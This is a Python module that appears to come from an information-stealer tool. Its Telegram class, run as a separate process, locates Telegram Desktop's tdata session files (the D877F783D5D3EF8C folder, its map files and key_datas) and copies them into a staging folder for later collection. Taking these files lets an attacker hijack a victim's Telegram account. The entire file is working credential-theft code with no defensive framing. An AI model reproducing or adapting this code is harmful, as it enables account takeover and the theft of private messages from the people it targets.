from re import findall
from shutil import copyfile
from multiprocessing import Process
from os import listdir, path, makedirs

from ..helpers.config import TelegramConfig


class Telegram(Process):

    def __init__(self, storage_path: str, folder: str, errors: bool):
        Process.__init__(self)

        self.config = TelegramConfig()
        self.storage_path = storage_path
        self.folder = folder
        self.errors = errors

    def __create_folder(self):

        folder = rf"{self.storage_path}\{self.folder}\D877F783D5D3EF8C"

        if not path.exists(folder):
            makedirs(folder)

    def __get_sessions(self):

        if not path.exists(self.config.SessionsPath):
            return

        folder = rf"{self.storage_path}\{self.folder}"
        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(self.config.SessionsPath)], [])

        if not sessions:
            return

        self.__create_folder()

        sessions.remove("D877F783D5D3EF8C")

        for session in sessions:
            copyfile(rf"{self.config.SessionsPath}\{session}", rf"{folder}\{session}")

        maps = sum([findall(r"map.*", file) for file in listdir(rf"{self.config.SessionsPath}\D877F783D5D3EF8C")], [])

        for map in maps:
            copyfile(rf"{self.config.SessionsPath}\D877F783D5D3EF8C\{map}", rf"{folder}\D877F783D5D3EF8C\{map}")

        copyfile(rf"{self.config.SessionsPath}\key_datas", rf"{folder}\key_datas")

    def run(self):

        try:

            self.__get_sessions()

        except Exception as e:
            if self.errors is True: print(f"[Telegram]: {repr(e)}")
